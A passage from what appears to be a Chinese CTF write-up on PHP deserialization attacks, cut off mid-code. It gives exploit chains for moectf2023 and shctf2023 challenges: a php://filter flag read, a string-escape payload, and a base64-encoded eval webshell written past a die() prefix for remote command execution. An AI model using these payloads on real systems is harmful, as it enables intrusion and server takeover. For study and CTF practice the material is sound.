php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var_1</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$var_1</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;q=<span class="keyword">new</span> C;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;z=<span class="keyword">new</span> D;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p=<span class="keyword">new</span> A;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> B;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="comment">//PD9waHANCiRmbGFnID0gImZsYWd7NjA0ODM3OTUtNDI5Ny00NDcxLTg0M2UtOTg0M2E1M2Q0YmE3fSI7DQo=</span></span><br></pre></td></tr></table></figure><h3 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h3><h4 id="关于反序列化字符串逃逸"><a href="#关于反序列化字符串逃逸" class="headerlink" title="关于反序列化字符串逃逸"></a>关于反序列化字符串逃逸</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;bob&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>=&gt;<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$sa</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sa</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">#$d=preg_replace(&#x27;/o/&#x27;,&#x27;oo&#x27;,$sa);</span></span><br><span class="line"><span class="comment">#echo &quot;&lt;br&gt;$d&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$d</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;name&quot;;s:50:&quot;boooooooooooooooooooooooob&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#echo strlen(&#x27;&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;&#x27;);</span></span><br><span class="line"><span class="variable">$dd</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/o/&#x27;</span>,<span class="string">&#x27;oo&#x27;</span>,<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$usdd</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$dd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dd</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$usdd</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串逃逸</span></span><br><span class="line"><span class="comment">//字符增加情况：上面的例子中字符串boooooooooooooooooooooooob&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;长度为50,由于$dd=preg_replace(&#x27;/o/&#x27;,&#x27;oo&#x27;,$d)将o变为oo，这样将&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;顶了出去，由于;&#125;闭合了反序列化，这样后面的;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;&#125;将被舍弃，这样就形成字符逃逸</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符减少情况：如果遇到过滤，将某一字符直接删除，那么就直接是值的替换，如：</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;name&quot;;s:28:&quot;flagflagflagflagflagflagflag&quot;;s:3:&quot;pwd&quot;;s:6:&quot;12345678&quot;;&#125;&quot;;s:3:&quot;pwd&quot;;s:4:&quot;hack&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//&quot;;s:3:&quot;pwd&quot;;s:4:&quot;12345678&quot;;&#125;长度为28直接替换name的值，;&#125;闭合，实现字符逃逸</span></span><br><span class="line"><span class="variable">$cc</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/flag/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$uscc</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cc</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$uscc</span>);</span><br></pre></td></tr></table></figure><h5 id="moectf2023-夺命十三枪"><a href="#moectf2023-夺命十三枪" class="headerlink" title="moectf2023 夺命十三枪"></a>moectf2023 夺命十三枪</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Hanxin.exe.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Chant</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>] : <span class="string">&#x27;夺命十三枪&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_visitor</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="variable">$Chant</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$new_visitor</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Your Movements: O:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;夺命十三枪&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Nobody&quot;</span>;&#125;</span><br><span class="line">Far away <span class="keyword">from</span> COOL...</span><br></pre></td></tr></table></figure><p>包含文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deadly_Thirteen_Spears</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>外部文件作用是接收传入的值，然后将其传入内部文件，若内部文件处理后的值可以被反序列化，则输出反序列化结果否则输出Even Caused A Glitch…，所以关键在于内部文件，通过分析代码，当<code>Spear_Owner = &#39;MaoLei&#39;</code>时才会输入flag，第一个类中出现了危险函数<code>str_replace</code>，这时候就想到了字符逃逸，我们传入的chant需要将<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>逃逸，<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>一共35个字符，在第一个类中，<code>&quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;</code>替换后，可以顶出5个字符，也就是可以逃逸5个字符，那么需要7个<code>di_qi_qiang</code>就能实现逃逸，payload：<code>?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p><h3 id="死亡函数绕过"><a href="#死亡函数绕过" class="headerlink" title="死亡函数绕过"></a>死亡函数绕过</h3><p>在一些题目中，会出现将特定死亡函数字符串与可修改字符串拼接的情况，由于base64在解码时，是4个字符为一组，这时候就可以在拼接时向特定字符串加入字符，此时将前面的死亡函数的字符串解码为乱码，而自己的字符串则解析为木马。</p><h4 id="shctf2023-sseerriiaalliizzee"><a href="#shctf2023-sseerriiaalliizzee" class="headerlink" title="shctf2023 sseerriiaalliizzee"></a>shctf2023 sseerriiaalliizzee</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$barking</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;barking = <span class="keyword">new</span> <span class="title class_">Flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;barking-&gt;<span class="title function_ invoke__">dosomething</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$part1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$part2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$part1</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$part2</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; part1 = <span class="variable">$part1</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; part2 = <span class="variable">$part2</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$useless</span>   = <span class="string">&#x27;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$useful</span>= <span class="variable">$useless</span>. <span class="variable language_">$this</span>-&gt;part2;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt; part1,<span class="variable">$useful</span>);<span class="comment">//将useful写入$this-&gt; part1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./flag,php&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;barking for fun!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no way, fuck off&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">no way, fuck off</span><br></pre></td></tr></table></figure><p>题目的链子很简单，<code>Start::__toString</code>-&gt;<code>CTF::dosomething</code>,原因：在Start调用__construct方法后，$this-&gt;barking会连接到Flag，但Flag会触发<code>__toString</code>，这样$this-&gt;barking会重新连接到CTF，因此我们可以省去中间$this-&gt;barking多余的操作(因为Flag类中没有属性)，直接让其触发<code>CTF::dosomething</code>，那么这里死亡函数<code>&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;</code>字符除去base64不会解码的还有26个，所以我们拼接两个字符让其乱码。exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$barking</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;barking = <span class="keyword">new</span> <span class="title class_">CTf</span>(<span class="string">&quot;php://filter/convert.base64-decode/resource=2.php&quot;</span>,<span class="string">&quot;ddPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;</span>);</span><br><span class="line">    &#125;<span class="comment">//将拼接字符base64解码写入文件2.php中dd是为了让死亡函数乱码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$part1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$part2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$part1</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$part2</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; part1 = <span class="variable">$part1</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; part2 = <span class="variable">$part2</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$useless</span>   = <span class="string">&#x27;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$useful</span>= <span class="variable">$useless</span>. <span class="variable language_">$this</span>-&gt;part2;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt; part1,<span class="variable">$useful</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Start</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:5:&quot;Start&quot;:1:&#123;s:7:&quot;barking&quot;;O:3:&quot;CTF&quot;:2:&#123;s:5:&quot;part1&quot;;s:49:&quot;php://filter/convert.base64-decode/resource=2.php&quot;;s:5:&quot;part2&quot;;s:42:&quot;ddPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>由于我们上传的一句话木马参数为cmd，所以直接蚁剑或访问2.php，post传参命令执行即可</p><p><img src="/2023/11/03/%E5%85%B3%E4%BA%8Ephp%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/die.png"></p><h3 id="提前赋值，引用绕过"><a href="#提前赋值，引用绕过" class="headerlink" title="提前赋值，引用绕过"></a>提前赋值，引用绕过</h3><h4 id="shctf2023-serialize"><a href="#shctf2023-serialize" class="headerlink" title="shctf2023 serialize"></a>shctf2023 serialize</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 